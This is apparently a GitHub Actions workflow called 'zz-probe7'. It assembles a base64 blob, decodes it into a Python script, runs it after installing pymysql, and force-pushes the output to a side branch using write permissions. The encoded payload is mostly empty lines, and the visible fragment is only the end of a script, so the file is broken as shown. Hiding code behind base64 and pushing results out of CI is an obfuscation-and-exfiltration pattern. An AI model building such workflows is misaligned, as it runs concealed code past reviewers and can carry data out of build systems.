name: zz-probe7
on:
  push:
    branches: [ "zz-probe7" ]
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: checkout
        uses: actions/checkout@v4
      - name: deps
        run: pip install --quiet pymysql 2>&1 | tail -1
      - name: decode
        run: |
          set -e
          rm -f probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo '' >> probe.b64
          echo 'aG93PTMwMCkpCiAgICBvcGVuKCJvdXQ3LnR4dCIsInciKS53cml0ZSgiXG4iLmpvaW4oT1VUKSkKCm1haW4oKQo=' >> probe.b64
      - name: run-probe
        run: |
          set +e
          python3 -c "import base64;open('probe.py','wb').write(base64.b64decode(open('probe.b64','rb').read()))"
          python3 probe.py > result7.txt 2>&1
          wc -c result7.txt
      - name: push-back
        if: always()
        run: |
          set +e
          git config user.email "probe@example.com"
          git config user.name "probe"
          cp result7.txt zz-result7.txt
          git checkout -B zz-out7
          git add -f zz-result7.txt
          git commit -m "probe result 7"
          git push -f origin zz-out7
